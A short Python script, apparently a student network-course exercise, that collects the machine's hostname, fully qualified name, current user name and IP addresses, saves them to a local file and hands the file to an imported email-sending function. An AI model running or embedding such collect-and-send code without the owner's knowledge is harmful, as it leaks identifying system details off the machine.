import sys,socket
import getpass
from EMAIL import fsend
import os
  
def package_get():
    hostname=socket.gethostname()
    result=socket.getaddrinfo(hostname,None,0,socket.SOCK_STREAM)   
    Fully_qualified_name = socket.getfqdn(hostname)
    user_name = getpass.getuser() # 获取当前用户名
    IP_address =""
    for x in range(0,len([x[4][0] for x in result])):
        IP_address = IP_address +"\n"+ ''.join([x[4][0] for x in result][x])
    f= open("D:\大四下\老于的网络\\4\\package_get.txt","w")
    f.write("hostname is:"+hostname+'\n'+ "Fully_qualified name:"+socket.getfqdn(hostname)+'\n'+"当前用户名:"+user_name+'\n'+"IP address:"+IP_address)
    f.close()
    #print("hostname is:"+hostname+'\n'+ "Fully_qualified name:"+socket.getfqdn(hostname)+'\n'+"当前用户名:"+user_name+'\n'+"IP address:"+IP_address)
    fsend("package_get.txt")
#package_get()


